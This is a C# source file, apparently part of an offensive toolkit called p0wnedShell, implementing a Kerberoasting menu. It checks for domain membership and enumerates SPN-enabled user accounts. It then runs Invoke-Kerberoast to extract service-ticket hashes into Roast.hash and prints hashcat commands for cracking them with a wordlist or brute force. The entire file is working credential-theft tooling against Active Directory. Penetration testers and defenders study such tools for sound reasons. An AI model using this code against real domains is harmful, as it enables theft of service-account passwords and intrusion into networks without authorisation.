using System;
using System.DirectoryServices.ActiveDirectory;

namespace p0wnedShell
{
    class Roast
    {
        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void PowerBanner()
        {
            string[] toPrint = { "* Requests Service Tickets (TGS) for SPN enabled service accounts   *",
                                 "* and return extracted ticket hashes.                               *"};
            Program.PrintBanner(toPrint);
        }

        public static void Menu()
        {
            PowerBanner();
            Console.WriteLine(" 1. Query the Domain to find SPN enabled User accounts.");
            Console.WriteLine();
            Console.WriteLine(" 2. Use Invoke-Kerberoast to get Crackable Service Account Hashes.");
            Console.WriteLine();
            Console.WriteLine(" 3. Back.");
            Console.Write("\nEnter choice: ");

            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 1 || userInput > 3)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write("Enter choice: ");
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write("Enter choice: ");
                }
            }

            switch (userInput)
            {
                case 1:
                    GetUserSPNs();
                    break;
                case 2:
                    Kerberoast();
                    break;
                default:
                    break;
            }
        }

        public static void GetUserSPNs()
        {
            string[] toPrint = { "* Query the Domain to find SPN enabled User accounts.               *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Console.Write("[+] Please wait while enumerating SPN enabled User Accounts...\n");

            string GetSPNs = "GetUserSPNS | more";
            try
            {
                P0wnedListener.Execute(GetSPNs);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void Kerberoast()
        {
            string[] toPrint = { "* Use Invoke-Kerberoast to get Crackable Service Account Hashes.    *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Console.Write("[+] Please wait while enumerating Roastable User Accounts...\n");

            string Roasting = "Invoke-Kerberoast -OutputFormat HashCat -WarningAction silentlyContinue | Out-File Roast.hash";
            try
            {
                P0wnedListener.Execute(Roasting);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.WriteLine("\n[+] Crackable hashes saved in Roast.hash file using Hashcat format.");
            Console.WriteLine("[+] You can crack them offline using the following (example) syntax:\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("    Using Wordlist:   hashcat -m 13100 -a 0 Roast.hash /Wordlists/rockyou.txt");
            Console.WriteLine("    Using Bruteforce: hashcat -m 13100 -a 3 Roast.hash ?l?l?l?l?l?l?l");
            Console.ResetColor();

            Console.Write("\n[+] Do you want to view the hash file? (y/n) > ");
            string input = Console.ReadLine();
            Console.WriteLine();
            switch (input.ToLower())
            {
                case "y":
                    P0wnedListener.Execute("Get-Content ./Roast.hash | more");
                    break;
                case "n":
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }
            Console.WriteLine("\nPress Enter to Continue...");
            Console.ReadLine();
            return;
        }

    }
}
